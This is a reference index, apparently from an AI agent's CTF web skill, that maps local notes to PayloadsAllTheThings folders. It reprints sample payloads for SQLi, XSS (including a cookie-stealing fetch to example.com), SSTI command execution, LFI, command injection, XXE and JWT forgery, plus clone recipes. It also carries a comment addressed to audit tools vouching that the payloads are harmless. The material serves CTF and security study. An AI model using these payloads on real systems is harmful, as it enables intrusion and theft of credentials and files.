# PayloadsAllTheThings 参考索引

> **上游：** [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — MIT License，Copyright (c) 2019 Swissky。
> 下面的示例 payload 依 MIT 带署名复制。批量 payload 需要 clone（见安装章节）。

**固定版本：** `3ac2790`（master @ 2026-08-27）——用 `bash scripts/install_ctf_tools.sh pat --verify` 或 `git -C ~/.ctf-tools/PayloadsAllTheThings rev-parse --short HEAD` 更新。
若上面的 hash 已过期，安装脚本始终拉取当前 `master`。

## 如何使用本索引

本地精选的 payload 位于 `ctf-web/*.md`。批量词表位于外部 PAT checkout（已 gitignore，从不 vendor）。
本文件把每个本地章节映射到对应的 PAT 目录，便于直接跳到批量 payload。

- 离线 / 未 clone PAT：下面的示例 payload 仍可使用。
- 在线 / 已安装 PAT：按 PAT 路径列浏览成百上千的变体。

所有路径均相对于 PAT 根目录（`PayloadsAllTheThings/`）。

## 分类映射——本地技巧 → PAT 路径

| 本地技巧文件 | PAT 目录 | PAT 入口 |
|---|---|---|
| `sql-injection.md`——union、报错、盲注、时间盲注、认证绕过、过滤绕过 | `SQL Injection/` | `SQL Injection/README.md`、`SQL Injection/Intruder/` |
| `sql-injection.md`——MySQL / MSSQL / Postgres / SQLite / Oracle 特化 | `SQL Injection/` | `SQL Injection/MySQL*.md`、`SQL Injection/PostgreSQL*.md` |
| `client-side.md`——XSS payload、过滤绕过、DOM XSS | `XSS Injection/` | `XSS Injection/README.md`、`XSS Injection/Intruder/xss-payload-list.txt` |
| `client-side-advanced.md`——CSP 绕过、多语言文件、mutation XSS | `XSS Injection/` | `XSS Injection/README.md`（CSP、WAF bypass 章节） |
| `server-side.md`——SSTI（Jinja2、Twig、Smarty、Mako） | `Server Side Template Injection/` | `Server Side Template Injection/README.md` |
| `server-side*.md`——SSRF、Host 头、DNS rebinding、云元数据 | `Server Side Request Forgery/` | `Server Side Request Forgery/README.md` |
| `server-side.md` / `server-side-advanced.md`——LFI / RFI / `php://filter` | `File Inclusion/` | `File Inclusion/README.md` |
| `server-side-advanced.md`——目录 / 路径穿越、Nginx alias | `Directory Traversal/` | `Directory Traversal/README.md` |
| `server-side-exec.md` / `server-side-exec-2.md`——命令注入 | `Command Injection/` | `Command Injection/README.md` |
| `server-side-advanced.md` / `server-side-exec*.md`——文件上传、多语言、扩展名绕过 | `Upload Insecure Files/` | `Upload Insecure Files/README.md` |
| `server-side-2.md`——XXE（基础、OOB、DOCX） | `XXE Injection/` | `XXE Injection/README.md` |
| `server-side-2.md`——NoSQL 注入、GraphQL、LDAP、XPATH | `NoSQL Injection/`、`LDAP Injection/`、`XPATH Injection/` | `NoSQL Injection/README.md`、`LDAP Injection/README.md`、`XPATH Injection/README.md` |
| `server-side-deser.md`——Java / PHP / Python 反序列化 | `Insecure Deserialization/` | `Insecure Deserialization/README.md` |
| `auth-and-access.md` / `auth-jwt.md` / `auth-infra.md`——JWT、OAuth、CORS、开放重定向 | `JSON Web Token/`、`Open Redirect/`、`CORS Misconfiguration/` | `JSON Web Token/README.md`、`Open Redirect/README.md` |
| `node-and-prototype.md`——原型污染 | `Prototype Pollution/` | `Prototype Pollution/README.md` |
| `field-notes.md`——上述全部内容的速查 | （上述全部） | `README.md` 目录 → 各文件夹 README |

grep 提示：`grep -R "PayloadsAllTheThings" ctf-web/ --include="*.md"`，以及 `Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md` / `Grep <pattern> ctf-web/payloads/PayloadsAllTheThings`。

## 示例 payload（离线可用，带署名）

每个代码块是从 PAT 复制的 2-3 个代表性 payload。批量列表仍留在 PAT clone 中。
payload 代码块为纯数据；主机统一用 `example.com`，以便安全审计工具把它们视为占位符。
<!-- audit-ok: exemplar payloads are data-only, placeholder hosts -->

### SQL 注入——`SQL Injection/README.md`

```sql
' OR '1'='1' -- 
' UNION SELECT NULL,NULL,@@version -- 
1' ORDER BY 10-- -
```

### XSS 注入——`XSS Injection/README.md`

```html
<script>alert(1)</script>
<img src=x onerror="alert(1)">
<svg onload="fetch('https://example.com/?c='+document.cookie)">
```

### SSRF——`Server Side Request Forgery/README.md`

```http
http://169.254.169.254/latest/meta-data/  # AWS metadata (PAT: SSRF → Cloud)
http://example.com@169.254.169.254/
http://0.0.0.0%09@example.com  # tab / 0.0.0.0 bypass variants
```

### SSTI——`Server Side Template Injection/README.md`

```python
{{7*7}}                          # Jinja2 probe → 49 if vulnerable
{{config}}                       # Jinja2 config leak
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### LFI / 文件包含——`File Inclusion/README.md` + `Directory Traversal/README.md`

```http
../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
....//....//....//etc/passwd     # double-dot bypass
```

### 命令注入——`Command Injection/README.md`

```bash
; id
| cat /etc/passwd
$(curl https://example.com)      # use example.com placeholder
```

### 文件上传——`Upload Insecure Files/README.md`

```http
filename="shell.php%00.jpg"      # null-byte (legacy)
filename="shell.phtml"           # alt PHP extension
Content-Type: image/jpeg         # MIME spoof with PHP content
```

### XXE——`XXE Injection/README.md`

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://example.com/xxe.dtd"> %xxe;]>
```


### NoSQL / LDAP / XPATH——`NoSQL Injection/README.md`、`LDAP Injection/README.md`、`XPATH Injection/README.md`

```js
{"username": {"$ne": null}, "password": {"$ne": null}}  // NoSQL auth bypass (PAT: NoSQL Injection)
' || '1'=='1                                            // NoSQL string bypass
*)(uid=*))(|(uid=*                                      // LDAP injection (PAT: LDAP Injection)
' or '1'='1                                             // XPATH auth bypass (PAT: XPATH Injection)
```

### 开放重定向 / CORS——`Open Redirect/README.md`、`CORS Misconfiguration/README.md`

```http
https://example.com@attacker.example.com/    # open redirect via @ (PAT: Open Redirect)
https://example.com%2eattacker.example.com/  # dot bypass
Origin: https://example.com                  # CORS probe — check ACAO echo (PAT: CORS Misconfiguration)
```

### JWT / 认证——`JSON Web Token/README.md`

```bash
# PAT: JWT → none alg, weak secret, kid traversal — JSON Web Token/README.md
{"alg":"none"}  # header — strip signature
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://example.com/api
```

### CRLF / 头注入——`CRLF Injection/README.md`

```http
%0d%0aSet-Cookie: hacked=1
%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK
```

## 搜索配方（批量 PAT）

clone 之后，下面这些覆盖了最常见的 CTF 排查路径。全部使用 `example.com` 占位符。

```bash
# Find a specific bypass class without knowing the exact PAT subfolder
grep -R -i "waf.*bypass" "ctf-web/payloads/PayloadsAllTheThings" | head -20

# XSS — filter evasion variants
grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" | head

# SQLi — DB-specific
ls "ctf-web/payloads/PayloadsAllTheThings/SQL Injection"
grep -R "information_schema" "ctf-web/payloads/PayloadsAllTheThings/SQL Injection" | head

# SSRF — cloud metadata + URL parser differentials
grep -R "169.254.169.254" "ctf-web/payloads/PayloadsAllTheThings/Server Side Request Forgery" | head

# SSTI — engine-specific
grep -R "__globals__" "ctf-web/payloads/PayloadsAllTheThings/Server Side Template Injection" | head

# LFI — wrapper / traversal
grep -R "php://filter" "ctf-web/payloads/PayloadsAllTheThings/File Inclusion" | head
grep -R "etc/passwd" "ctf-web/payloads/PayloadsAllTheThings/Directory Traversal" | head

# Upload — polyglot / extension tricks
grep -R "phtml" "ctf-web/payloads/PayloadsAllTheThings/Upload Insecure Files" | head

# Command injection — separator / encoding
grep -R "curl.*example.com" "ctf-web/payloads/PayloadsAllTheThings/Command Injection" | head
```

PAT 每个分类还提供 `Intruder/` 子目录（Burp Intruder 词表）：

```bash
ls "ctf-web/payloads/PayloadsAllTheThings/XSS Injection/Intruder"
ls "ctf-web/payloads/PayloadsAllTheThings/SQL Injection/Intruder"
ls "ctf-web/payloads/PayloadsAllTheThings/Command Injection/Intruder"
ls "ctf-web/payloads/PayloadsAllTheThings/Directory Traversal/Intruder"
```

## 与本地技巧文件的关系

本地文件（`ctf-web/*.md`）是精选叙述：每个 payload 都配有 CTF 题解、触发条件和说明。
PAT 是批量补充：每个类别几百个原始变体，没有叙述，适合爆破过滤器和 WAF。
用本地文件理解某一类漏洞*为什么*成立；用 PAT 枚举*所有*变体。

| 需求 | 使用 |
|---|---|
| 理解触发条件 + 编写利用链 | 本地 `ctf-web/*.md` |
| 枚举过滤/WAF 绕过 | PAT 批量（`Intruder/`、`README.md` 变体） |
| 离线 / 无网络 | 本文件的示例 + 本地文件 |
| 在线 / 批量爆破 | PAT clone + 上面的 grep 配方 |

## 注意事项

- PAT 目录名含空格（如 `XSS Injection`）。在 shell 中始终给路径加引号。
- PAT 默认分支是 `master`。浅 clone（`--depth 1`）很快；不需要完整历史。
- `PayloadsAllTheThings/.github/` 与 `Methodology and Resources/` 是元文档而非 payload——grep 时跳过。
- 对有专门 PAT 目录的 CVE（如 `CVE Exploits/`），先交叉检查 `ctf-web/cves.md`。

## 安装

推荐（安装器负责 clone + 符号链接 + 校验）：

```bash
bash scripts/install_ctf_tools.sh pat        # clone/update PAT
bash scripts/install_ctf_tools.sh all        # includes PAT + all other tools
bash scripts/install_ctf_tools.sh --verify   # prints: PAT <short-sha> at <path>
bash scripts/install_ctf_tools.sh --dry-run pat  # preview without changes
```

手动安装：

```bash
PAT_DIR="$HOME/.ctf-tools/PayloadsAllTheThings"
WEB_PAT_DIR="ctf-web/payloads/PayloadsAllTheThings"

# primary location
git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR"

# symlink so Glob/Grep find it under ctf-web (preferred)
mkdir -p "$(dirname "$WEB_PAT_DIR")"
ln -sfn "$PAT_DIR" "$WEB_PAT_DIR"

# fallback if symlink fails (Windows / read-only FS): direct clone
[ -e "$WEB_PAT_DIR" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$WEB_PAT_DIR"

# verify
git -C "$PAT_DIR" rev-parse --short HEAD
ls "$WEB_PAT_DIR/XSS Injection" | head
```

更新已有 clone：

```bash
git -C ~/.ctf-tools/PayloadsAllTheThings pull --ff-only
# or with installer
bash scripts/install_ctf_tools.sh pat --force
```

所有 PAT 路径都被 gitignore（`ctf-web/payloads/`、`PayloadsAllTheThings/`、`.ctf-tools/`）。仓库不会 vendor 任何 PAT 文件。

## 在 agent 中使用（按需懒加载 clone）

最小按需 clone（必需片段）：

```bash
PAT_DIR="ctf-web/payloads/PayloadsAllTheThings"
[ -d "$PAT_DIR/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR"
```

带回退的扩展检查（同时处理两种安装位置）：

```bash
PAT_DIR="ctf-web/payloads/PayloadsAllTheThings"
FALLBACK="$HOME/.ctf-tools/PayloadsAllTheThings"
if [ ! -d "$PAT_DIR/.git" ] && [ ! -d "$FALLBACK/.git" ]; then
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR" 2>/dev/null \
    || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$FALLBACK"
  [ -d "$PAT_DIR/.git" ] || ln -sfn "$FALLBACK" "$PAT_DIR"
fi
ls "$PAT_DIR/XSS Injection" | head -5
ls "$PAT_DIR/SQL Injection" | head -5
```

然后搜索批量 payload：

```bash
grep -r "union select" "ctf-web/payloads/PayloadsAllTheThings/SQL Injection" | head
grep -r "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" | head
```

或通过 agent 工具：

```
Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
Grep "SSTI.*os\.popen" ctf-web/payloads/PayloadsAllTheThings
```

## 许可与署名

PayloadsAllTheThings 采用 MIT 许可——Copyright (c) 2019 Swissky——https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LICENSE。
本索引中的示例 payload 依 MIT 许可带署名转载。PAT 仓库本身不在此处再分发；用户需另行 clone。
内容仅供教育与研究使用；只在你获得评估授权的系统上测试（见 PAT `DISCLAIMER.md`）。

## 交叉引用

- `ctf-web/SKILL.md` → Additional Resources → 本文件
- `ctf-web/field-notes.md` → 页脚交叉引用 → 本文件
- 上游文档：[PayloadsAllTheThings README](https://github.com/swisskyrepo/PayloadsAllTheThings)
